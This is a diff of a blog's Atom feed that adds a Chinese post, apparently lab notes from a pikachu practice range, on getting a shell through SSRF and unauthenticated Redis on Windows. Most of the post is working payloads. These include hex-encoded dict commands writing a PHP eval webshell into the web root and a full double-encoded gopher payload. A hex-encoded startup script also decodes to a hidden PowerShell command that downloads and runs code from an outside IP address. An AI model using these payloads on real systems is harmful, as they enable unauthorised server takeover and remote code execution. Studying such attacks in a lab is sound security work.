@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cherry-cheeks.github.io</id>
     <title>cherry cheeks</title>
-    <updated>2021-10-24T04:27:00.058Z</updated>
+    <updated>2021-10-24T04:48:33.675Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cherry-cheeks.github.io"/>
     <link rel="self" href="https://cherry-cheeks.github.io/atom.xml"/>
@@ -10,6 +10,72 @@
     <logo>https://cherry-cheeks.github.io/images/avatar.png</logo>
     <icon>https://cherry-cheeks.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, cherry cheeks</rights>
+    <entry>
+        <title type="html"><![CDATA[ssrf + redis（windows）未授权 getshell]]></title>
+        <id>https://cherry-cheeks.github.io/post/ssrf-rediswindowswei-shou-quan-getshell/</id>
+        <link href="https://cherry-cheeks.github.io/post/ssrf-rediswindowswei-shou-quan-getshell/">
+        </link>
+        <updated>2021-10-24T04:47:16.000Z</updated>
+        <content type="html"><![CDATA[<p>环境配置<br>
+windows server 2012 r2	pikachu靶场	windows_redis</p>
+<p>ssrf漏洞点</p>
+<p>接着用试着用dict协议探测内网开放端口，本文的目标是6379端口（redis服务）</p>
+<p>开放<br>
+验证是否存在未授权</p>
+<p>存未授权</p>
+<p>现有条件<br>
+1、存在ssrf漏洞<br>
+2、存在redis未授权<br>
+3、知道web目录：C:\phpstudy_pro\WWW\test</p>
+<p>那么就可以考虑getshell<br>
+利用ssrf的协议有四个：file、http、gopher、dict<br>
+本篇笔记就用 gopher 和 dict 这两个协议写shell</p>
+<p>服务器命令写shell<br>
+用服务器上的命令行写shell演示如下图</p>
+<p>写入成功</p>
+<p>ssrf+dict协议+redis写shell<br>
+flushall</p>
+<p>这里目录要用16进制的\x编码，然后再用双括号括起来<br>
+加密网址：http://www.atoolbox.net/Tool.php?Id=816</p>
+<p>config:set:dir:&quot;\x43\x3a\x5c\x70\x68\x70\x73\x74\x75\x64\x79\x5f\x70\x72\x6f\x5c\x57\x57\x57\x5c\x74\x65\x73\x74&quot;</p>
+<p>config:set:dbfilename:dict.php</p>
+<p>最后写webshell会遇到问题，因为如果这里的webshell内容不用16进制的\x编码的话，会出现写shell写不进去的情况<br>
+原webshell：<?php @eval($_POST[pass]);?></p>
+<p>16进制\x加密webshell：\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x70\x61\x73\x73\x5d\x29\x3b\x3f\x3e</p>
+<p>还有这里不能把webshell内容用单引号括起来，要用双引号，用单引号16进制的webshell内容不会被解析<br>
+set:'webshell':&quot;\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x70\x61\x73\x73\x5d\x29\x3b\x3f\x3e&quot;</p>
+<p>save</p>
+<p>用蚁剑连接webshell</p>
+<p>dict写入成功</p>
+<p>注意_1：当我们用dict协议写shell的时候，需要将目录的绝对路径和webshell的内容用16进制的\x进行编码，并用双引号括起来！这是为了准确性不出错！</p>
+<p>注意_2：当用dict协议写入启动项的时候，不论脚本格式是vbs还是bat，要保证它们顺利运行，都要将脚本内容给放到单独一行！！！</p>
+<p>所以我们就可以在脚本内容前后加入\r\n改成<br>
+set qdx &quot;\r\n\r\n\r\n\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65\x20\x2d\x6e\x6f\x70\x20\x2d\x77\x20\x68\x69\x64\x64\x65\x6e\x20\x2d\x63\x20\x22\x49\x45\x58\x20\x28\x28\x6e\x65\x77\x2d\x6f\x62\x6a\x65\x63\x74\x20\x6e\x65\x74\x2e\x77\x65\x62\x63\x6c\x69\x65\x6e\x74\x29\x2e\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x74\x72\x69\x6e\x67\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x31\x31\x38\x2e\x33\x31\x2e\x31\x37\x32\x2e\x32\x32\x30\x3a\x34\x32\x32\x33\x31\x2f\x61\x27\x29\x29\x22\r\n\r\n&quot;</p>
+<p>最终就会得到干净的脚本</p>
+<p>ssrf+gopher协议+redis写shell<br>
+gopher协议较为复杂，没有dict协议那么简易，所以这里利用工具生成基于gopher协议的payload<br>
+工具地址：https://github.com/firebroo/sec_tools</p>
+<p>首先编辑 *\ec_tools-master\redis-over-gopher 目录下的redis.cmd的内容<br>
+flushall<br>
+config set dir C:\phpstudy_pro\WWW\test<br>
+config set dbfilename gopher.php<br>
+set 'webshell' '<?php @eval($_POST[pass]);)?>'<br>
+save</p>
+<p>接着运行同目录下面的 redis-over-gopher.py 生成payload</p>
+<p>gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2532%2537%250d%250a%2543%253a%255c%255c%2570%2568%2570%2573%2574%2575%2564%2579%255f%2570%2572%256f%255c%255c%2557%2557%2557%255c%255c%2574%2565%2573%2574%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2531%2530%250d%250a%2567%256f%2570%2568%2565%2572%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2532%2538%250d%250a%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2570%2561%2573%2573%255d%2529%253b%253f%253e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a</p>
+<p>最后将二次编码的payload放入url，直接发送</p>
+<p>500错误，这不是问题啊哈，这是执行成功</p>
+<p>用蚁剑连接</p>
+<p>写入成功<br>
+这个工具个人认为只适合写简短的一句话，不适合写启动项之类的，暂时来讲我现在认为dict协议比这个gopher协议好用</p>
+<p>总结<br>
+总的来说，在服务器是windows情况下，如果同时存在redis和ssrf情况下，就可以直接写shell，可用dict、gopher两个协议<br>
+经过两天的试验，在存在 ssrf + redis未授权 情况下，dict协议比gopher协议做的事情多，dict可以写shell、启动项</p>
+<p>learn from<br>
+https://blog.csdn.net/weixin_36064196/article/details/114470727<br>
+https://blog.csdn.net/qq_44159028/article/details/117034100?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[test]]></title>
         <id>https://cherry-cheeks.github.io/post/test/</id>
